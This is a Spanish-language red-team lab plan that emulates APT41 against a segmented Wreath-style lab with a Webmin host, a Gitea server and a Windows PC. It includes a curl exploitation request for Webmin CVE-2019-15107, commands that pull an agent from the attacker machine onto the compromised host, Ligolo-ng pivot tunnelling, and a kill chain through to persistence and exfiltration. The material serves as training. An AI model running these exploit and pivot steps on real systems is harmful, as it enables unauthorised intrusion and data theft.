# Infrastructure Setup — Operación SILENT BRIDGE
## Entorno de Lab + Configuración de Vulnerabilidades
**Operación:** SILENT BRIDGE | **Adversario:** APT41 | **Framework:** MITRE ATT&CK v14  
**Operador:** Adrián Camacho | **Fecha:** —  
**Repositorio:** github.com/adr-camacho/RedTeam-Ops-Roadmap


> **Módulo M0 · Ruta: `[setup]`**
>
> **Objetivo único:** Entorno segmentado (DMZ + red interna) con Webmin vulnerable sembrado.
>
> **Prerequisito real:** ninguno.
>
> **Habilita:** que exista un objetivo expuesto que enumerar (M1).
>
> **TTP:** — (provisión)
>
> ### Mapa de la operación (cadena de pivoting)
> ```
> M0 setup → M1 recon-ext → M2 Webmin RCE → M3 pivot (Ligolo) → [M1 recon-int] → M4 C2 interno → M5 persistencia+objetivo
> ```
> **Lectura:** a diferencia de Lab-01 (DAG con ramas), Lab-02 es una **cadena lineal**: cada salto depende del
> anterior. En pivoting no puedes saltarte un eslabón — sin foothold no hay túnel, sin túnel no hay red interna.
> Todo es **ruta crítica**; no hay ramas opcionales.

---

## 1. Topología de Red

```
┌─────────────────────────────────────────────────────────────────────┐
│                      RED NAT — LabRedTeam                           │
│                                                                     │
│   ┌─────────────────┐                  ┌──────────────────────────┐ │
│   │   Kali Linux    │ ── port :11601 ──►│   PROD (Linux)          │ │
│   │   10.0.2.9      │◄── Ligolo TLS ───│   10.0.2.200            │ │
│   │   Atacante      │                  │   Webmin :10000 (vuln)  │ │
│   └────────┬────────┘                  │   Apache :80            │ │
│            │                           │   SSH :22               │ │
│            │ (vía túnel)               └────────────┬────────────┘ │
│            │                                        │              │
│            │                    Red Interna (.X/24) │              │
│            │                    ┌───────────────────┘              │
│            ▼                    ▼                                   │
│   ┌──────────────────────────────────────────────────────────────┐ │
│   │                    Red Interna                               │ │
│   │  ┌──────────────────────┐    ┌──────────────────────────┐   │ │
│   │  │   GIT SERVER (Linux) │    │   PC (Windows)           │   │ │
│   │  │   10.0.2.X           │    │   10.0.2.X               │   │ │
│   │  │   Gitea :3000        │    │   SMB :445               │   │ │
│   │  │   SSH :22            │    │   WinRM :5985            │   │ │
│   │  └──────────────────────┘    │   RDP :3389              │   │ │
│   │                              └──────────────────────────┘   │ │
│   └──────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────────┘
```

> Las IPs de la red interna se confirmarán durante la Fase 4 (post-pivote). Actualizar este documento con los valores reales al finalizar la operación.

---

## 2. Inventario de Máquinas

| Host | Sistema Operativo | IP | Rol en la operación |
|------|------------------|----|-------------------|
| Kali | Kali Linux 2026.1 | `10.0.2.9` | Máquina operadora APT41 |
| PROD | Linux (CentOS/Ubuntu) | `10.0.2.200` | Punto de entrada — pivote Ligolo-ng |
| GIT | Linux | `10.0.2.TBD` | Servidor interno — credenciales en repos |
| PC | Windows 10/11 | `10.0.2.TBD` | Objetivo final — red interna |

**Dominio:** `wreath.thm` (o el dominio configurado en el lab propio)  
**Hipervisor:** Oracle VirtualBox  
**Tipo de red:** NAT Network — `LabRedTeam`

---

## 3. Vectores de Ataque Preconfigurados

A diferencia de Lab-01 (AD plano), Wreath es un entorno de **tres nodos en red segmentada**. Los vectores son principalmente de aplicación web y configuración insegura, no de Kerberos.

### 3.1 — CVE-2019-15107 (Webmin RCE Pre-Auth)
**Máquina afectada:** PROD  
**Puerto:** 10000 (Webmin)  
**Versión vulnerable:** Webmin < 1.920 con `passwd_mode` activo  
**Tipo:** RCE sin autenticación via parámetro `old` en `/password_change.cgi`  
**Realismo:** CVE activo en infraestructuras legacy que no aplican parches de seguridad — patrón habitual en entornos industriales y SMB  

```
# Verificación manual de la versión
curl -sk https://<PROD_IP>:10000/ | grep -i "version"

# Payload de explotación manual
curl -sk "https://<PROD_IP>:10000/password_change.cgi" \
  --data "user=root&pam=&expired=2&old=test|<PAYLOAD>&new1=test&new2=test"
```

**TTP:** T1190 — Exploit Public-Facing Application

### 3.2 — Credenciales en Repositorio Git
**Máquina afectada:** GIT Server  
**Servicio:** Gitea / Git bare repository  
**Vector:** Credenciales hardcodeadas en el historial de commits o en archivos de configuración  
**Realismo:** Error de seguridad frecuente en equipos de desarrollo — credenciales comprometidas en repositorios internos  

**TTP:** T1552.001 — Credentials in Files

### 3.3 — Acceso WinRM con credenciales encontradas
**Máquina afectada:** PC Windows  
**Servicio:** WinRM (5985)  
**Vector:** Credenciales obtenidas del repositorio Git usadas para acceso remoto  
**Realismo:** Reutilización de credenciales entre servicios — patrón APT41  

**TTP:** T1021.006 — Remote Services: Windows Remote Management

---

## 4. Herramientas y Binarios Necesarios

### Ligolo-ng — Compilación y preparación

```bash
# Descargar releases desde GitHub
# https://github.com/nicocha30/ligolo-ng/releases

# Linux (agent para PROD)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz

# Windows (agent para PC — si se necesita segundo pivote)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_windows_amd64.zip

# Proxy (Kali)
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz

# Extraer
tar -xzf ligolo-ng_proxy_*.tar.gz
tar -xzf ligolo-ng_agent_linux*.tar.gz
unzip ligolo-ng_agent_windows*.zip
```

### Sliver C2 — Verificar instalación

```bash
# Verificar que Sliver está operativo desde Lab-01
sudo systemctl status sliver
sliver --version
```

### Transfer server (para subir agent a PROD)

```bash
# Servidor HTTP simple desde Kali
cd /path/to/ligolo-ng/
python3 -m http.server 8888

# En PROD (tras foothold)
wget http://10.0.2.9:8888/agent -O /tmp/agent && chmod +x /tmp/agent
# o
curl http://10.0.2.9:8888/agent -o /tmp/agent && chmod +x /tmp/agent
```

---

## 5. Configuración del Túnel Ligolo-ng — Referencia Operacional

### Setup completo paso a paso

```bash
# ─── KALI — Preparar interfaz (una sola vez por sesión) ───
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
ip link show ligolo   # verificar: state UP

# ─── KALI — Arrancar proxy ───
./proxy -selfcert -laddr 0.0.0.0:11601
# Output esperado:
# INFO[...] Starting proxy on 0.0.0.0:11601
# Aguardar conexión del agent

# ─── PROD — Lanzar agent (tras foothold) ───
./agent -connect 10.0.2.9:11601 -ignore-cert &
# Output esperado:
# INFO[...] Agent connected to 10.0.2.9:11601

# ─── KALI — En la consola Ligolo-ng ───
ligolo-ng » session          # listar sesiones disponibles
ligolo-ng » [0]              # seleccionar la sesión
ligolo-ng » ifconfig         # ver interfaces de red visibles desde PROD
# → identificar el segmento de red interna (ej: 10.200.X.0/24)

ligolo-ng » start            # activar túnel
# Output: INFO[...] Starting tunnel to agent

# ─── KALI — Añadir ruta hacia red interna ───
sudo ip route add 10.200.X.0/24 dev ligolo   # usar el segmento real
# Verificar:
ip route | grep ligolo

# ─── KALI — Verificar conectividad ───
ping 10.200.X.X            # host interno
nmap -sn 10.200.X.0/24    # host discovery interno
```

### Segundo pivote (si se necesita)

Si la red interna tiene un tercer segmento accesible solo desde GIT o PC:

```bash
# En Ligolo-ng — añadir listener para segundo agent
ligolo-ng » listener_add --addr 0.0.0.0:11602 --to 10.0.2.9:11601

# En GIT o PC — lanzar segundo agent apuntando al listener
./agent -connect <IP_PROD>:11602 -ignore-cert
# El tráfico se tuneliza: PC → PROD → Kali
```

---

## 6. Kill Chains disponibles

```
PATH A — Webmin RCE → Pivote → PC Windows [Principal]
─────────────────────────────────────────────────────────────
  Nmap → Webmin :10000 → CVE-2019-15107
    → Shell en PROD
    → Ligolo-ng agent → Túnel TLS
    → Enumeración red interna
    → Gitea → credenciales en repo
    → Evil-WinRM → PC Windows
    → Sliver beacon → C2 en red interna
    → Persistencia + exfiltración
  Estado: pendiente

PATH B — Webmin RCE → SSH Key Discovery → GIT pivot
─────────────────────────────────────────────────────────────
  Si se encuentran SSH keys en PROD:
    → SSH directo a GIT server
    → Enumeración de repos
    → Credenciales PC Windows
  Estado: a evaluar durante operación
```

---

## 7. Estructura del repositorio

```
Lab-02-Wreath/
├── setup/
│   └── infrastructure_setup.md          ← Este documento
├── loot/
│   ├── users.txt                         ← Usuarios identificados
│   ├── credentials.txt                   ← Credenciales obtenidas
│   └── exfiltrated/                      ← Ficheros exfiltrados del PC
├── nmap/
│   ├── prod_ports.*                      ← Port scan PROD
│   ├── prod_detailed.*                   ← Service scan PROD
│   ├── internal_sweep.*                  ← Host discovery interno
│   ├── git_detailed.*                    ← Service scan GIT
│   └── pc_detailed.*                     ← Service scan PC
├── screenshots/
│   ├── FASE-1-Reconnaissance/
│   ├── FASE-2-Foothold/
│   ├── FASE-3-Pivot-Ligolo-ng/
│   ├── FASE-4-Internal-Enum/
│   ├── FASE-5-Lateral-Movement/
│   ├── FASE-6-C2-Sliver/
│   └── FASE-7-Persistence-Objective/
├── docs/
│   ├── enumeration_log.md               ← Fases 1 y 4
│   ├── exploitation.md                  ← Fase 2: CVE-2019-15107
│   ├── pivoting.md                      ← Fase 3: Ligolo-ng
│   ├── post-exploitation.md             ← Fase 5: Lateral Movement
│   ├── c2_sliver.md                     ← Fase 6: Beacon
│   ├── persistence.md                   ← Fase 7
│   └── infrastructure_setup.md          ← Este documento
└── OPERATION_SILENT_BRIDGE.md           ← Plan de operación completo
```

---

## 8. Notas OPSEC — APT41

| Principio APT41 | Implementación |
|----------------|----------------|
| Explotación web como vector inicial | CVE-2019-15107 — sin interacción de usuario |
| Pivotaje inmediato post-foothold | Ligolo-ng agent desplegado antes de enumerar la máquina comprometida |
| Implante solo en objetivo final | Agent Ligolo en PROD, Sliver beacon solo en PC Windows |
| LOLBins en Discovery | Comandos nativos en PC antes de subir herramientas |
| Documentación en tiempo real | IPs reales anotadas al confirmarlas; diagrama actualizado por fase |

---

**Fases pendientes al inicio de operación:** Todas (1→7)  
**Prerequisito:** Entorno Wreath desplegado y accesible. Kali en 10.0.2.9 con Ligolo-ng y Sliver instalados.